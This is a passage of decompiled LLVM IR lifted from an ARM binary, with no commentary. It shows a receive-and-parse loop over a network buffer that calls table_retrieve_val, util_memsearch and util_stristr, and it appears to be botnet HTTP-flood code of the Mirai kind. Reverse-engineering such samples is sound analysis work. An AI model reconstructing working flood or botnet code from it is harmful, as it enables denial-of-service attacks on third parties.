  store i32 %v2_8df8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8dfc = icmp eq i32 %v2_8df8, 0
  store i1 %v2_8dfc, i1* %cpsr_z.global-to-local, align 1
  %v2_8e00 = add i32 %v0_8de8, 12
  %v3_8e00 = inttoptr i32 %v2_8e00 to i32*
  store i32 %v2_8df8, i32* %v3_8e00, align 4
  br i1 %v2_8dfc, label %dec_label_pc_96b0, label %dec_label_pc_8e08

dec_label_pc_8e08:                                ; preds = %dec_label_pc_8de0, %dec_label_pc_8ec4, %dec_label_pc_8df4, %dec_label_pc_8f4c
  %v0_8e08 = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e08 = icmp eq i32 %v0_8e08, 0
  store i1 %v2_8e08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8e08, label %dec_label_pc_8e58, label %dec_label_pc_8e10

dec_label_pc_8e10:                                ; preds = %dec_label_pc_8e08
  %v0_8e10 = load i32, i32* @sl, align 4
  %v1_8e10 = add i32 %v0_8e10, 660
  %v2_8e10 = inttoptr i32 %v1_8e10 to i32*
  %v3_8e10 = load i32, i32* %v2_8e10, align 4
  store i32 %v3_8e10, i32* @r3, align 4
  %v2_8e14 = sub i32 %v3_8e10, %v0_8e08
  store i32 %v2_8e14, i32* @r4, align 4
  store i32 %v2_8e14, i32* @r2, align 4
  store i32 %v2_8e14, i32* %v2_8e10, align 4
  %v0_8e20 = load i32, i32* @r7, align 4
  %v1_8e20 = load i32, i32* @r6, align 4
  %v2_8e20 = add i32 %v1_8e20, %v0_8e20
  store i32 %v2_8e20, i32* @r1, align 4
  store i32 %v0_8e20, i32* @r0, align 4
  %v3_8e28 = call i32 @memmove(i32 %v0_8e20, i32 %v2_8e20, i32 %v2_8e14)
  store i32 %v3_8e28, i32* %r0.global-to-local, align 4
  %v0_8e2c = load i32, i32* @sl, align 4
  %v1_8e2c = add i32 %v0_8e2c, 660
  %v2_8e2c = inttoptr i32 %v1_8e2c to i32*
  %v3_8e2c = load i32, i32* %v2_8e2c, align 4
  store i32 %v3_8e2c, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8e34 = load i32, i32* %sb.global-to-local, align 4
  %v2_8e34 = add i32 %v0_8e34, %v3_8e2c
  store i32 %v2_8e34, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e38 = icmp eq i32 %v3_8e2c, 0
  store i1 %v2_8e38, i1* %cpsr_z.global-to-local, align 1
  %v3_8e3c = add i32 %v2_8e34, 2116
  %v4_8e3c = inttoptr i32 %v3_8e3c to i8*
  store i8 0, i8* %v4_8e3c, align 1
  %v0_8e40 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8e40, label %dec_label_pc_8e58, label %dec_label_pc_8e44

dec_label_pc_8e44:                                ; preds = %dec_label_pc_8e10, %dec_label_pc_8da4
  %v0_8e44 = load i32, i32* @sl, align 4
  %v1_8e44 = add i32 %v0_8e44, 12
  %v2_8e44 = inttoptr i32 %v1_8e44 to i32*
  %v3_8e44 = load i32, i32* %v2_8e44, align 4
  store i32 %v3_8e44, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e48 = icmp eq i32 %v3_8e44, 0
  store i1 %v2_8e48, i1* %cpsr_z.global-to-local, align 1
  %v5_8e4c = icmp sgt i32 %v3_8e44, 0
  br i1 %v5_8e4c, label %dec_label_pc_8dbc, label %dec_label_pc_8e50

dec_label_pc_8e50:                                ; preds = %dec_label_pc_8e44
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_8de0

dec_label_pc_8e58:                                ; preds = %dec_label_pc_8e10, %dec_label_pc_8e08
  %v0_8e58 = load i32, i32* @sl, align 4
  %v1_8e58 = add i32 %v0_8e58, -1448
  %v2_8e58 = inttoptr i32 %v1_8e58 to i8*
  %v3_8e58 = load i8, i8* %v2_8e58, align 1
  %v4_8e58 = zext i8 %v3_8e58 to i32
  store i32 %v4_8e58, i32* %r3.global-to-local, align 4
  %v2_8e5c = icmp ugt i8 %v3_8e58, 6
  store i1 %v2_8e5c, i1* %cpsr_c.global-to-local, align 1
  %v7_8e5c = icmp eq i8 %v3_8e58, 7
  store i1 %v7_8e5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e5c, label %dec_label_pc_8e64, label %dec_label_pc_87ec

dec_label_pc_8e64:                                ; preds = %dec_label_pc_8e58
  %v1_8e64 = add i32 %v0_8e58, 660
  %v2_8e64 = inttoptr i32 %v1_8e64 to i32*
  %v3_8e64 = load i32, i32* %v2_8e64, align 4
  store i32 %v3_8e64, i32* @r3, align 4
  %v2_8e68 = icmp ugt i32 %v3_8e64, 1023
  store i1 %v2_8e68, i1* %cpsr_c.global-to-local, align 1
  %v7_8e68 = icmp eq i32 %v3_8e64, 1024
  store i1 %v7_8e68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e68, label %dec_label_pc_8e70.loopexit, label %dec_label_pc_8d74

dec_label_pc_8e70.loopexit:                       ; preds = %dec_label_pc_8e64
  %v0_8e70.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_8e78.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8e70

dec_label_pc_8e70:                                ; preds = %dec_label_pc_8e70.loopexit, %dec_label_pc_8d58
  %v0_8e78 = phi i32 [ %v0_8e78.pre, %dec_label_pc_8e70.loopexit ], [ %v1_8d6c, %dec_label_pc_8d58 ]
  %v0_8e70 = phi i32 [ %v0_8e70.pre, %dec_label_pc_8e70.loopexit ], [ %v0_8d60, %dec_label_pc_8d58 ]
  %v1_8e74 = add i32 %v0_8e70, 2180
  store i32 %v1_8e74, i32* @r1, align 4
  store i32 %v0_8e78, i32* @r0, align 4
  store i32 960, i32* @r2, align 4
  %v3_8e80 = call i32 @memmove(i32 %v0_8e78, i32 %v1_8e74, i32 960)
  store i32 %v3_8e80, i32* %r0.global-to-local, align 4
  %v0_8e84 = load i32, i32* @sl, align 4
  %v1_8e84 = add i32 %v0_8e84, 660
  %v2_8e84 = inttoptr i32 %v1_8e84 to i32*
  %v3_8e84 = load i32, i32* %v2_8e84, align 4
  store i32 %v3_8e84, i32* %r3.global-to-local, align 4
  %v1_8e88 = add i32 %v3_8e84, -64
  store i32 %v1_8e88, i32* @r4, align 4
  store i32 %v1_8e88, i32* %v2_8e84, align 4
  br label %dec_label_pc_8d74

dec_label_pc_8e94:                                ; preds = %dec_label_pc_8dbc
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v3_8e9c = call i32 @table_retrieve_val(i32 36, i32* null)
  %v0_8ea0 = load i32, i32* @r4, align 4
  store i32 %v0_8ea0, i32* %r1.global-to-local, align 4
  store i32 %v3_8e9c, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_8eac = load i32, i32* @r7, align 4
  store i32 %v0_8eac, i32* %r0.global-to-local, align 4
  %v4_8eb0 = call i32 @util_memsearch(i32 %v0_8eac, i32 %v0_8ea0, i32 %v3_8e9c, i32 11)
  store i32 %v4_8eb0, i32* %r0.global-to-local, align 4
  %v3_8eb4 = icmp eq i32 %v4_8eb0, -1
  store i1 %v3_8eb4, i1* %cpsr_c.global-to-local, align 1
  %v8_8eb4 = icmp eq i32 %v4_8eb0, -1
  store i1 %v8_8eb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8eb4, label %dec_label_pc_8ebc, label %dec_label_pc_998c

dec_label_pc_8ebc:                                ; preds = %dec_label_pc_8e94
  %v0_8ebc = load i32, i32* @sl, align 4
  %v1_8ebc = add i32 %v0_8ebc, 12
  %v2_8ebc = inttoptr i32 %v1_8ebc to i32*
  %v3_8ebc = load i32, i32* %v2_8ebc, align 4
  store i32 %v3_8ebc, i32* @r5, align 4
  br label %dec_label_pc_8de0

dec_label_pc_8ec4:                                ; preds = %dec_label_pc_8de8
  %v0_8ec4 = load i32, i32* @r7, align 4
  store i32 %v0_8ec4, i32* %r0.global-to-local, align 4
  %v1_8ec8 = add i32 %v0_8de8, 660
  %v2_8ec8 = inttoptr i32 %v1_8ec8 to i32*
  %v3_8ec8 = load i32, i32* %v2_8ec8, align 4
  store i32 %v3_8ec8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_8ed4 = call i32 @util_memsearch(i32 %v0_8ec4, i32 %v3_8ec8, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32 2)
  store i32 %v5_8ed4, i32* %r0.global-to-local, align 4
  %v2_8ed8 = icmp eq i32 %v5_8ed4, -1
  store i1 %v2_8ed8, i1* %cpsr_c.global-to-local, align 1
  %v7_8ed8 = icmp eq i32 %v5_8ed4, -1
  store i1 %v7_8ed8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8ed8, label %dec_label_pc_8e08, label %dec_label_pc_8ee0

dec_label_pc_8ee0:                                ; preds = %dec_label_pc_8ec4
  %v0_8ee0 = load i32, i32* @sl, align 4
  %v1_8ee0 = add i32 %v0_8ee0, 660
  %v2_8ee0 = inttoptr i32 %v1_8ee0 to i32*
  %v3_8ee0 = load i32, i32* %v2_8ee0, align 4
  store i32 %v3_8ee0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v0_8eec = load i32, i32* @r7, align 4
  store i32 %v0_8eec, i32* %r0.global-to-local, align 4
  %v5_8ef0 = call i32 @util_memsearch(i32 %v0_8eec, i32 %v3_8ee0, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32 2)
  %v0_8ef4 = load i32, i32* %sb.global-to-local, align 4
  %v2_8ef4 = add i32 %v0_8ef4, %v5_8ef0
  store i32 %v2_8ef4, i32* %ip.global-to-local, align 4
  store i32 %v5_8ef0, i32* @r6, align 4
  store i32 %v5_8ef0, i32* %r1.global-to-local, align 4
  %v0_8f00 = load i32, i32* @r7, align 4
  store i32 %v0_8f00, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b408.49 to i32), i32* %r2.global-to-local, align 4
  %v0_8f08 = load i32, i32* @r4, align 4
  store i32 %v0_8f08, i32* %r3.global-to-local, align 4
  %v0_8f0c = load i32, i32* @r5, align 4
  %v1_8f0c = trunc i32 %v0_8f0c to i8
  %v3_8f0c = add i32 %v2_8ef4, 2114
  %v4_8f0c = inttoptr i32 %v3_8f0c to i8*
  store i8 %v1_8f0c, i8* %v4_8f0c, align 1
  %v4_8f10 = call i32 @util_memsearch(i32 %v0_8f00, i32 %v5_8ef0, i32 ptrtoint (i32* @global_var_1b408.49 to i32), i32 %v0_8f08)
  store i32 %v4_8f10, i32* %r0.global-to-local, align 4
  %v2_8f14 = icmp eq i32 %v4_8f10, -1
  store i1 %v2_8f14, i1* %cpsr_c.global-to-local, align 1
  %v7_8f14 = icmp eq i32 %v4_8f10, -1
  store i1 %v7_8f14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8f14, label %dec_label_pc_8f38, label %dec_label_pc_8f1c

dec_label_pc_8f1c:                                ; preds = %dec_label_pc_8ee0
  %v0_8f1c = load i32, i32* @r7, align 4
  store i32 %v0_8f1c, i32* %r0.global-to-local, align 4
  %v0_8f20 = load i32, i32* @r6, align 4
  store i32 %v0_8f20, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b408.49 to i32), i32* %r2.global-to-local, align 4
  %v0_8f28 = load i32, i32* @r4, align 4
  store i32 %v0_8f28, i32* %r3.global-to-local, align 4
  %v4_8f2c = call i32 @util_memsearch(i32 %v0_8f1c, i32 %v0_8f20, i32 ptrtoint (i32* @global_var_1b408.49 to i32), i32 %v0_8f28)
  %v0_8f30 = load i32, i32* %sb.global-to-local, align 4
  %v2_8f30 = add i32 %v0_8f30, %v4_8f2c
  store i32 %v2_8f30, i32* %r0.global-to-local, align 4
  %v0_8f34 = load i32, i32* @r5, align 4
  %v1_8f34 = trunc i32 %v0_8f34 to i8
  %v3_8f34 = add i32 %v2_8f30, 2116
  %v4_8f34 = inttoptr i32 %v3_8f34 to i8*
  store i8 %v1_8f34, i8* %v4_8f34, align 1
  br label %dec_label_pc_8f38

dec_label_pc_8f38:                                ; preds = %dec_label_pc_8ee0, %dec_label_pc_8f1c
  %v0_8f38 = load i32, i32* @r7, align 4
  store i32 %v0_8f38, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_8f40 = inttoptr i32 %v0_8f38 to i8*
  %v3_8f40 = call i32 @util_atoi(i8* %v2_8f40, i32 16)
  store i32 %v3_8f40, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8f44 = icmp eq i32 %v3_8f40, 0
  store i1 %v2_8f44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8f44, label %dec_label_pc_9b40, label %dec_label_pc_8f4c

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f38
  %v1_8f4c = add i32 %v3_8f40, 2
  store i32 %v1_8f4c, i32* %r3.global-to-local, align 4
  %v1_8f50 = load i32, i32* @sl, align 4
  %v2_8f50 = add i32 %v1_8f50, 12
  %v3_8f50 = inttoptr i32 %v2_8f50 to i32*
  store i32 %v1_8f4c, i32* %v3_8f50, align 4
  br label %dec_label_pc_8e08

dec_label_pc_8f58:                                ; preds = %dec_label_pc_85c4
  %v2_8f58 = inttoptr i32 %v1_8618 to i32*
  %v3_8f58 = load i32, i32* %v2_8f58, align 4
  store i32 %v3_8f58, i32* %ip.global-to-local, align 4
  %v3_8f60 = udiv i32 %v3_8f58, 32
  %v3_8f64 = mul nuw nsw i32 %v3_8f60, 4
  store i32 %v2_8710, i32* @lr, align 4
  %v2_8f6c = add i32 %v3_8f64, %v2_8710
  store i32 %v2_8f6c, i32* %r2.global-to-local, align 4
  %v1_8f70 = add i32 %v2_8f6c, -164
  %v2_8f70 = inttoptr i32 %v1_8f70 to i32*
  %v3_8f70 = load i32, i32* %v2_8f70, align 4
  %v1_8f74 = urem i32 %v3_8f58, 32
  store i32 %v1_8f74, i32* %r0.global-to-local, align 4
  store i32 %v1_85bc, i32* %r3.global-to-local, align 4
  %v7_8f7c = shl i32 %v1_85bc, %v1_8f74
  %v8_8f7c = or i32 %v3_8f70, %v7_8f7c
  store i32 %v8_8f7c, i32* %r1.global-to-local, align 4
  %v1_8f80 = load i32, i32* @r8, align 4
  %v2_8f80 = sub i32 %v3_8f58, %v1_8f80
  %v3_8f80 = icmp uge i32 %v3_8f58, %v1_8f80
  store i1 %v3_8f80, i1* %cpsr_c.global-to-local, align 1
  %v4_8f80 = xor i32 %v1_8f80, %v3_8f58
  %v5_8f80 = xor i32 %v2_8f80, %v3_8f58
  %v6_8f80 = and i32 %v5_8f80, %v4_8f80
  %v7_8f80 = icmp slt i32 %v6_8f80, 0
  %v8_8f80 = icmp slt i32 %v2_8f80, 0
  %v9_8f80 = icmp eq i32 %v3_8f58, %v1_8f80
  store i1 %v9_8f80, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8f7c, i32* %v2_8f70, align 4
  %v3_8f88 = xor i1 %v8_8f80, %v7_8f80
  %v4_8f88 = or i1 %v9_8f80, %v3_8f88
  br i1 %v4_8f88, label %dec_label_pc_85f4, label %dec_label_pc_8f8c

dec_label_pc_8f8c:                                ; preds = %dec_label_pc_8f58
  %v0_8f8c = load i32, i32* %ip.global-to-local, align 4
  %v1_8f8c = load i32, i32* %r3.global-to-local, align 4
  %v2_8f8c = add i32 %v1_8f8c, %v0_8f8c
  store i32 %v2_8f8c, i32* @r8, align 4
  br label %dec_label_pc_8738

dec_label_pc_8f94:                                ; preds = %dec_label_pc_8848
  store i32 %v3_888c, i32* %r0.global-to-local, align 4
  %v1_8f98 = call i32 @__GI___libc_close(i32 %v3_888c)
  store i32 %v1_8f98, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_8fa0 = load i32, i32* @sl, align 4
  %v2_8fa0 = add i32 %v1_8fa0, -1452
  %v3_8fa0 = inttoptr i32 %v2_8fa0 to i32*
  store i32 -1, i32* %v3_8fa0, align 4
  %v0_8fa4 = load i32, i32* @r5, align 4
  %v1_8fa4 = trunc i32 %v0_8fa4 to i8
  %v2_8fa4 = load i32, i32* @sl, align 4
  %v3_8fa4 = add i32 %v2_8fa4, -1448
  %v4_8fa4 = inttoptr i32 %v3_8fa4 to i8*
  store i8 %v1_8fa4, i8* %v4_8fa4, align 1
  br label %dec_label_pc_87ec

dec_label_pc_8fac:                                ; preds = %dec_label_pc_85cc
  %v2_8fac = inttoptr i32 %v1_8618 to i32*
  %v3_8fac = load i32, i32* %v2_8fac, align 4
  store i32 %v3_8fac, i32* %ip.global-to-local, align 4
  %v3_8fb4 = udiv i32 %v3_8fac, 32
  store i32 %v2_8710, i32* %r1.global-to-local, align 4
  %v3_8fbc = mul nuw nsw i32 %v3_8fb4, 4
  %v2_8fc0 = add i32 %v3_8fbc, %v2_8710
  store i32 %v2_8fc0, i32* %r2.global-to-local, align 4
  %v1_8fc4 = add i32 %v2_8fc0, -164
  %v2_8fc4 = inttoptr i32 %v1_8fc4 to i32*
  %v3_8fc4 = load i32, i32* %v2_8fc4, align 4
  %v1_8fc8 = urem i32 %v3_8fac, 32
  store i32 %v1_8fc8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8fd0 = shl i32 1, %v1_8fc8
  %v8_8fd0 = or i32 %v3_8fc4, %v7_8fd0
  store i32 %v8_8fd0, i32* %r1.global-to-local, align 4
  %v1_8fd4 = load i32, i32* @r8, align 4
  %v2_8fd4 = sub i32 %v3_8fac, %v1_8fd4
  %v3_8fd4 = icmp uge i32 %v3_8fac, %v1_8fd4
  store i1 %v3_8fd4, i1* %cpsr_c.global-to-local, align 1
  %v4_8fd4 = xor i32 %v1_8fd4, %v3_8fac
  %v5_8fd4 = xor i32 %v2_8fd4, %v3_8fac
  %v6_8fd4 = and i32 %v5_8fd4, %v4_8fd4
  %v7_8fd4 = icmp slt i32 %v6_8fd4, 0
  %v8_8fd4 = icmp slt i32 %v2_8fd4, 0
  %v9_8fd4 = icmp eq i32 %v3_8fac, %v1_8fd4
  store i1 %v9_8fd4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8fd0, i32* %v2_8fc4, align 4
  %v3_8fdc = xor i1 %v8_8fd4, %v7_8fd4
  %v4_8fdc = or i1 %v9_8fd4, %v3_8fdc
  br i1 %v4_8fdc, label %dec_label_pc_85f4, label %dec_label_pc_8fe0

dec_label_pc_8fe0:                                ; preds = %dec_label_pc_8fac
  %v0_8fe0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8fe0 = load i32, i32* %r3.global-to-local, align 4
  %v2_8fe0 = add i32 %v1_8fe0, %v0_8fe0
  store i32 %v2_8fe0, i32* @r8, align 4
  br label %dec_label_pc_8738

dec_label_pc_9028:                                ; preds = %dec_label_pc_87d0
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  %v2_9030 = call i32 @util_zero(i32 %v2_827c, i32 10240)
  store i32 %v2_9030, i32* %r0.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_903c = load i32, i32* @sl, align 4
  %v1_903c = add i32 %v0_903c, -1452
  %v2_903c = inttoptr i32 %v1_903c to i32*
  %v3_903c = load i32, i32* %v2_903c, align 4
  store i32 %v3_903c, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v4_9048 = call i32 @__libc_recv(i32 %v3_903c, i32 %v2_827c, i32 10240, i32 16386)
  store i32 %v4_9048, i32* %r0.global-to-local, align 4
  store i32 %v4_9048, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9050 = icmp eq i32 %v4_9048, 0
  store i1 %v2_9050, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r7, align 4
  %tmp181 = icmp slt i32 %v4_9048, 1
  br i1 %tmp181, label %dec_label_pc_9550, label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9028
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  store i32 %v4_9048, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b400.51 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_906c = call i32 @util_memsearch(i32 %v2_827c, i32 %v4_9048, i32 ptrtoint ([5 x i8]* @global_var_1b400.51 to i32), i32 4)
  store i32 %v5_906c, i32* %r0.global-to-local, align 4
  %v3_9070 = icmp eq i32 %v5_906c, -1
  store i1 %v3_9070, i1* %cpsr_c.global-to-local, align 1
  %v8_9070 = icmp eq i32 %v5_906c, -1
  store i1 %v8_9070, i1* %cpsr_z.global-to-local, align 1
  %v0_9078 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v3_9070, label %dec_label_pc_9078, label %dec_label_pc_9080

dec_label_pc_9078:                                ; preds = %dec_label_pc_905c
  %v3_9078 = icmp ugt i32 %v0_9078, 10239
  store i1 %v3_9078, i1* %cpsr_c.global-to-local, align 1
  %v8_9078 = icmp eq i32 %v0_9078, 10240
  store i1 %v8_9078, i1* %cpsr_z.global-to-local, align 1
  %v5_907c = icmp slt i32 %v0_9078, 10240
  br i1 %v5_907c, label %dec_label_pc_87ec, label %dec_label_pc_9080

dec_label_pc_9080:                                ; preds = %dec_label_pc_905c, %dec_label_pc_9078
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b400.51 to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_9078, i32* %r1.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v5_9090 = call i32 @util_memsearch(i32 %v2_827c, i32 %v0_9078, i32 ptrtoint ([5 x i8]* @global_var_1b400.51 to i32), i32 4)
  store i32 %v2_827c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v4_909c = add i32 %v5_9090, %v2_827c
  %v5_909c = inttoptr i32 %v4_909c to i8*
  store i8 0, i8* %v5_909c, align 1
  %v0_90a0 = load i32, i32* @r5, align 4
  store i32 %v0_90a0, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v2_90a8 = inttoptr i32 %v0_90a0 to i32*
  %v3_90a8 = call i32 @table_retrieve_val(i32 46, i32* %v2_90a8)
  %v0_90ac = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_90ac, i32* @r1, align 4
  store i32 %v3_90a8, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_90b8 = call i32 @util_stristr(i8* %tmp168, i32 %v0_90ac, i32 %v3_90a8)
  store i32 %v4_90b8, i32* %r0.global-to-local, align 4
  %v2_90bc = icmp eq i32 %v4_90b8, -1
  store i1 %v2_90bc, i1* %cpsr_c.global-to-local, align 1
  %v7_90bc = icmp eq i32 %v4_90b8, -1
  store i1 %v7_90bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90bc, label %.thread23, label %bb182

bb182:                                            ; preds = %dec_label_pc_9080
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_90c4 = load i32, i32* @sl, align 4
  %v3_90c4 = inttoptr i32 %v2_90c4 to i32*
  store i32 2, i32* %v3_90c4, align 4
  br label %.thread23

.thread23:                                        ; preds = %dec_label_pc_9080, %bb182
  %v0_90c8 = load i32, i32* @r5, align 4
  store i32 %v0_90c8, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v2_90d0 = inttoptr i32 %v0_90c8 to i32*
  %v3_90d0 = call i32 @table_retrieve_val(i32 45, i32* %v2_90d0)
  %v0_90d4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_90d4, i32* @r1, align 4
  store i32 %v3_90d0, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_90e0 = call i32 @util_stristr(i8* %tmp168, i32 %v0_90d4, i32 %v3_90d0)
  store i32 %v4_90e0, i32* %r0.global-to-local, align 4
  %v2_90e4 = icmp eq i32 %v4_90e0, -1
  store i1 %v2_90e4, i1* %cpsr_c.global-to-local, align 1
  %v7_90e4 = icmp eq i32 %v4_90e0, -1
  store i1 %v7_90e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90e4, label %.thread24, label %bb183

bb183:                                            ; preds = %.thread23
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_90ec = load i32, i32* @sl, align 4
  %v3_90ec = inttoptr i32 %v2_90ec to i32*
  store i32 1, i32* %v3_90ec, align 4
  br label %.thread24

.thread24:                                        ; preds = %.thread23, %bb183
  %v0_90f0 = load i32, i32* @r5, align 4
  store i32 %v0_90f0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_90f8 = load i32, i32* @sl, align 4
  %v2_90f8 = add i32 %v1_90f8, 4
  %v3_90f8 = inttoptr i32 %v2_90f8 to i32*
  store i32 %v0_90f0, i32* %v3_90f8, align 4
  %v2_90fc = inttoptr i32 %v0_90f0 to i32*
  %v3_90fc = call i32 @table_retrieve_val(i32 44, i32* %v2_90fc)
  %v0_9100 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9100, i32* @r1, align 4
  store i32 %v3_90fc, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_910c = call i32 @util_stristr(i8* %tmp168, i32 %v0_9100, i32 %v3_90fc)
  store i32 %v4_910c, i32* %r0.global-to-local, align 4
  %v2_9110 = icmp eq i32 %v4_910c, -1
  store i1 %v2_9110, i1* %cpsr_c.global-to-local, align 1
  %v7_9110 = icmp eq i32 %v4_910c, -1
  store i1 %v7_9110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9110, label %.thread25, label %dec_label_pc_9118

dec_label_pc_9118:                                ; preds = %.thread24
  %v0_9118 = load i32, i32* @r5, align 4
  store i32 %v0_9118, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v2_9120 = inttoptr i32 %v0_9118 to i32*
  %v3_9120 = call i32 @table_retrieve_val(i32 44, i32* %v2_9120)
  %v0_9124 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9124, i32* @r1, align 4
  store i32 %v3_9120, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_9130 = call i32 @util_stristr(i8* %tmp168, i32 %v0_9124, i32 %v3_9120)
  store i32 %v4_9130, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v2_9138 = add i32 %v4_9130, %v2_827c
  %v3_9138 = inttoptr i32 %v2_9138 to i8*
  %v4_9138 = load i8, i8* %v3_9138, align 1
  %v2_9140 = icmp ugt i8 %v4_9138, 31
  store i1 %v2_9140, i1* %cpsr_c.global-to-local, align 1
  %v7_9140 = icmp eq i8 %v4_9138, 32
  store i1 %v7_9140, i1* %cpsr_z.global-to-local, align 1
  %v2_9148 = zext i1 %v7_9140 to i32
  %v2_9148.v4_9130 = add i32 %v2_9148, %v4_9130
  store i32 %v2_9148.v4_9130, i32* @r4, align 4
  %v2_914c = add i32 %v2_9148.v4_9130, %v2_827c
  store i32 %v2_914c, i32* @r6, align 4
  store i32 %v2_914c, i32* %r0.global-to-local, align 4
  %v1_9154 = load i32, i32* %fp.global-to-local, align 4
  %v2_9154 = sub i32 %v1_9154, %v2_9148.v4_9130
  store i32 %v2_9154, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9160 = call i32 @util_memsearch(i32 %v2_914c, i32 %v2_9154, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32 2)
  store i32 %v5_9160, i32* %r0.global-to-local, align 4
  %v2_9164 = icmp eq i32 %v5_9160, -1
  store i1 %v2_9164, i1* %cpsr_c.global-to-local, align 1
  %v7_9164 = icmp eq i32 %v5_9160, -1
  store i1 %v7_9164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9164, label %.thread25, label %dec_label_pc_916c

dec_label_pc_916c:                                ; preds = %dec_label_pc_9118
  %v2_916c = icmp ne i32 %v5_9160, 0
  store i1 %v2_916c, i1* %cpsr_c.global-to-local, align 1
  %v7_916c = icmp eq i32 %v5_9160, 1
  store i1 %v7_916c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %r2.global-to-local, align 4
  %v7_9174 = icmp slt i32 %v5_9160, 2
  br i1 %v7_9174, label %bb185, label %bb184

bb184:                                            ; preds = %dec_label_pc_916c
  %v9_9174 = add i32 %v5_9160, -2
  store i32 %v9_9174, i32* %r0.global-to-local, align 4
  br label %bb185

bb185:                                            ; preds = %dec_label_pc_916c, %bb184
  %v1_917c = phi i32 [ %v5_9160, %dec_label_pc_916c ], [ %v9_9174, %bb184 ]
  store i32 %v2_8710, i32* %r2.global-to-local, align 4
  %v2_917c = add i32 %v1_917c, %v2_8710
  %v1_9180 = load i32, i32* @r4, align 4
